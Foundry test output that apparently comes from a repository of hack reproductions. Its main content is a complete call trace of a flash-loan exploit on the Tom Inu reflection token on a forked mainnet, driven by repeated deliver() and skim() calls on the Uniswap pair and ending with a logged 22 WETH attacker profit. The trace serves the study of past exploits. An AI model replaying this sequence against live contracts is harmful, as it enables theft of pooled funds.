Compiling 27 files with Solc 0.8.25
Solc 0.8.25 finished in 1.13s
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 307.52ms (101.44Вµs CPU time)

Ran 1 test for src/test/2023-01/TINU_exp.sol:TomInuExploit
[PASS] testHack() (gas: 440905)
Logs:
  316 TINU in pair before deliver
  1465 TINU in attack contract before deliver
  -------------Delivering-------------
  2050 TINU in pair after deliver
  0 TINU in attack contract after deliver
  -------------Skimming---------------
  323 TINU in pair after skim
  1733 TINU in attack contract after skim
  -------------Delivering-------------
  11191855 TINU in pair after deliver 2
  0 TINU in attack contract after deliver 2
  
 Attacker's profit: 22 WETH

Traces:
  [474805] TomInuExploit::testHack()
    в”њв”Ђ [0] VM::createSelectFork("https://eth.llamarpc.com", 16489408 [1.648e7])
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [467947] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], 0x)
    в”‚   в”њв”Ђ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 139039729301264180297254 [1.39e23]
    в”‚   в”њв”Ђ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”њв”Ђ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 104850000000000000000 [1.048e20])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 104850000000000000000 [1.048e20])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [414138] TomInuExploit::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [104850000000000000000 [1.048e20]], [0], 0x)
    в”‚   в”‚   в”њв”Ђ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [24609] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [191414] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(104850000000000000000 [1.048e20], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ [8225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb835752Feb00c278484c464b697e03b03C53E11B, 104850000000000000000 [1.048e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb835752Feb00c278484c464b697e03b03C53E11B, value: 104850000000000000000 [1.048e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [20777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [2504] 0xb835752Feb00c278484c464b697e03b03C53E11B::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000609977d2a0e5a8e68e00000000000000000000000000000000000000000000000133514952669a6a7000000000000000000000000000000000000000000000000000000000610fc0b8
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 126994561461014981232 [1.269e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [144905] 0xb835752Feb00c278484c464b697e03b03C53E11B::swap(1470449218539614064547 [1.47e21], 0, TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [108274] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1470449218539614064547 [1.47e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1352813281056444939385 [1.352e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 316871513264115731249 [3.168e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 126994561461014981232 [1.269e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(: 316871513264115731249 [3.168e20], : 126994561461014981232 [1.269e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(param0: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, param1: 5374761729091646534 [5.374e18], param2: 104850000000000000000 [1.048e20], param3: 1470449218539614064547 [1.47e21], param4: 0, param5: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1465904852700232013011 [1.465e21]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 316871513264115731249 [3.168e20]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in pair before deliver", 316) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1465904852700232013011 [1.465e21]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in attack contract before deliver", 1465) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [0] console::log("-------------Delivering-------------") [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1465904852700232013011 [1.465e21]
    в”‚   в”‚   в”њв”Ђ [7383] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::deliver(1465904852700232013011 [1.465e21])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2050642424158542203032 [2.05e21]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in pair after deliver", 2050) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in attack contract after deliver", 0) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [0] console::log("-------------Skimming---------------") [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [38606] 0xb835752Feb00c278484c464b697e03b03C53E11B::skim(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2050642424158542203032 [2.05e21]
    в”‚   в”‚   в”‚   в”њв”Ђ [23174] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1733770910894426471783 [1.733e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1595069238022872354042 [1.595e21])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 126994561461014981232 [1.269e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 323338092012961377606 [3.233e20]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in pair after skim", 323) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1733769909104888397946 [1.733e21]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in attack contract after skim", 1733) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [0] console::log("-------------Delivering-------------") [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1733769909104888397946 [1.733e21]
    в”‚   в”‚   в”њв”Ђ [7383] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::deliver(1733769909104888397946 [1.733e21])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11191855315120216048899805 [1.119e25]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in pair after deliver 2", 11191855 [1.119e7]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 32051 [3.205e4]
    в”‚   в”‚   в”њв”Ђ [0] console::log("%s TINU in attack contract after deliver 2", 0) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 126994561461014981232 [1.269e20]
    в”‚   в”‚   в”њв”Ђ [40580] 0xb835752Feb00c278484c464b697e03b03C53E11B::swap(0, 126984561461014981232 [1.269e20], TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”њв”Ђ [23162] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 126984561461014981232 [1.269e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xb835752Feb00c278484c464b697e03b03C53E11B, to: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 126984561461014981232 [1.269e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [4777] 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11191855315120216048899805 [1.119e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xb835752Feb00c278484c464b697e03b03C53E11B) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10000000000000000 [1e16]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(: 11191855315120216048899805 [1.119e25], : 10000000000000000 [1e16])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(param0: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 11191538443606951933168556 [1.119e25], param2: 0, param3: 0, param4: 126984561461014981232 [1.269e20], param5: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 104850000000000000000 [1.048e20])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, value: 104850000000000000000 [1.048e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 22134561461014981232 [2.213e19]
    в”‚   в”‚   в”њв”Ђ [0] console::log("\n Attacker's profit: %s WETH", 22) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 139039729301264180297254 [1.39e23]
    в”‚   в”њв”Ђ emit FlashLoan(param0: TomInuExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param2: 104850000000000000000 [1.048e20], param3: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.37s (1.37s CPU time)

Ran 2 test suites in 1.37s (1.67s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
